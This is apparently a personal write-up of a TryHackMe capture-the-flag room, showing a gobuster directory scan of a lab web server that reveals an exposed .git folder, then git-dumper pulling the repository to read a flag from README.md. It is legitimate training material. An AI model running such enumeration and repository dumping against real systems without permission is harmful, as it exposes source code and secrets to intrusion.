---
created: 2026-10-12
tags:
  - note
  - journal
  - cyberStuff
title: Room 404
date: 2026-10-12T09:32:23.027Z
lastmod: 2026-10-12T09:51:48.089Z
---
link: https://tryhackme.com/room/hh-room404-804573bf\
first scan :

```bash
┌──(k㉿kali)-[~/Desktop]
└─ gobuster dir -u http://<YOUR_IP>:8080 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.112.191.61:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.git                 (Status: 200) [Size: 437]
.git/HEAD            (Status: 200) [Size: 21]
.git/config          (Status: 200) [Size: 92]
.git/index           (Status: 200) [Size: 289]
.git/logs/           (Status: 200) [Size: 165]
Progress: 4751 / 4751 (100.00%)
===============================================================
Finished
===============================================================

```

interesting .git exposed , use git-dump to investigate it\
to install git-dump use this [repo](https://github.com/arthaud/git-dumper)

```bash
┌──(k㉿kali)-[~/Desktop]
└─ git-dumper http://10.112.191.61:8080 <FOLDER-WHERE-U-WANT-TO-DUMP>
```

after that we find the flag in README.md

```
┌──(k㉿kali)-[~/Desktop/something]
└─ ls
app.js  index.html  README.md

┌──(k㉿kali)-[~/Desktop/something]
└─ cat README.md
# Byte Lotus — Guest Experience Platform

Internal staging repository for the guest app and concierge personalization
service. Do not deploy this folder to production.

Staging flag (remove before launch): THM{FLAG}
```
